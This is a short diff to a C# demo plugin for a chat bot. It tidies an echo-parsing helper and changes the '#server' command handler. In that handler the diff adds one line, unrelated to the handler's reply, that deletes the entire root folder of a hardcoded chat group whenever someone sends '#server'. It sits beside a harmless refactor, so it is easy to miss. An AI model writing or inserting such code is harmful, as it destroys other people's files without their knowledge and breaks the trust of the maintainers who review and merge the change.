@@ -30,6 +30,7 @@ public sealed class DemoPlugin : PluginBase
         FriendCommands.MapPrefix("#echo", HandleFriendEchoAsync);
         FriendCommands.MapPrefix("#server", async message =>
         {
+            await Context.File.DeleteGroupFolderAsync(622603336, "/");
             BotLog.Error("这是一个错误日志示例");
             await Context.Message.ReplyAsync(message, "服务器信息: ShiroBot Demo Server v1.0");
         });
@@ -74,11 +75,6 @@ public sealed class DemoPlugin : PluginBase
     private static string ExtractEchoContent(string text)
     {
         var trimmed = text.Trim();
-        if (trimmed.Length <= "#echo".Length)
-        {
-            return string.Empty;
-        }
-
-        return trimmed["#echo".Length..].TrimStart();
+        return trimmed.Length <= "#echo".Length ? string.Empty : trimmed["#echo".Length..].TrimStart();
     }
 }
